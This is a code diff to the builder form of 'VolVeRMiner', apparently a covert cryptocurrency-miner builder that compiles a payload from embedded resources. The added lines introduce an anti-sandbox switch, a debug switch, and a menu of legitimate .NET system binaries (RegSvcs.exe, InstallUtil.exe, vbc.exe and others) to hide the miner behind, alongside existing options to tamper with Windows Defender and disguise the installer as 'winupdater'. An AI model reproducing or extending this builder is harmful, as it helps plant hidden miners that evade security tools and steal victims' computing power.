@@ -86,6 +86,7 @@ namespace VolVeRMiner
             string Source3 = Properties.Resources.Installer;
             string Source4 = Properties.Resources.RAM;
             string Source5 = Properties.Resources.Resources_Designer;
+            string Source6 = Properties.Resources.Analysis;
 
 
             using (var r = new ResourceWriter(Path.GetTempPath() + @"\" + resxPath2 + ".resources"))
@@ -123,6 +124,22 @@ namespace VolVeRMiner
             {
                 Source2 = Source2.Replace("defender", "false");
             }
+            if (checkBox4.Checked == true)
+            {
+                Source2 = Source2.Replace("antisand", "true");
+            }
+            if (checkBox4.Checked == false)
+            {
+                Source2 = Source2.Replace("antisand", "false");
+            }
+            if (checkBox5.Checked == true)
+            {
+                Source2 = Source2.Replace("debug", "false");
+            }
+            if (checkBox5.Checked == false)
+            {
+                Source2 = Source2.Replace("debug", "false");
+            }
             Source3 = Source3.Replace("winupdater", textBox8.Text);
             Source3 = Source3.Replace("DRR", textBox12.Text);
             Source2 = Source2.Replace("winupdater", textBox8.Text);
@@ -152,11 +169,37 @@ namespace VolVeRMiner
 
             }
 
+            if (comboBox1.Text == "RegSvcs.exe & vbc.exe")
+            {
+                Source = Source.Replace("#appdate", "RegSvcs.exe");
+                Source = Source.Replace("#winappdate", "vbc.exe");
+            }
+            if (comboBox1.Text == "InstallUtil.exe & AddInUtil.exe")
+            {
+                Source = Source.Replace("#appdate", "InstallUtil.exe");
+                Source = Source.Replace("#winappdate", "AddInUtil.exe");
+            }
+            if (comboBox1.Text == "jsc.exe & EdmGen.exe")
+            {
+                Source = Source.Replace("#appdate", "jsc.exe");
+                Source = Source.Replace("#winappdate", "EdmGen.exe");
+            }
+            if (comboBox1.Text == "ngentask.exe & vbc.exe")
+            {
+                Source = Source.Replace("#appdate", "ngentask.exe");
+                Source = Source.Replace("#winappdate", "vbc.exe");
+            }
+            if (comboBox1.Text == "DataSvcUtil.exe & aspnet_state.exe")
+            {
+                Source = Source.Replace("#appdate", "DataSvcUtil.exe");
+                Source = Source.Replace("#winappdate", "aspnet_state.exe");
+            }
+
 
             var settings = new Dictionary<string, string>();
             settings.Add("CompilerVersion", "v4.0"); //Указываем версию framework-a 2.0
 
-            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source, Source2, Source4, Source5, Source3.ToString());
+            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source, Source2, Source4, Source5, Source6, Source3.ToString());
 
  
 
@@ -223,6 +266,11 @@ namespace VolVeRMiner
             ofd.Filter = "jpg|*.jpg| bmp|*.bmp";
             if (ofd.ShowDialog(this) == DialogResult.OK)
                 this.BackgroundImage = Image.FromFile(ofd.FileName);
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
 
         }
     }
